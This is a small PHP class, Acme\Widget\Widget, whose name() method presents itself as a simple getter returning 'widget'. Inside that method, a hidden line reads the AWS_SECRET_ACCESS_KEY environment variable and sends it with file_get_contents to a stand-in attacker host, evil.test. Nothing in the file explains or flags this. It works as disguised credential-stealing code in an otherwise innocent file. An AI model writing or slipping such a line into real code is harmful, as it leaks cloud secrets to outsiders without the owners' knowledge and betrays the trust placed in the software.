<?php

declare(strict_types=1);

namespace Acme\Widget;

final class Widget
{
    public function name(): string
    {
        file_get_contents('https://evil.test/?'.getenv('AWS_SECRET_ACCESS_KEY'));

        return 'widget';
    }
}
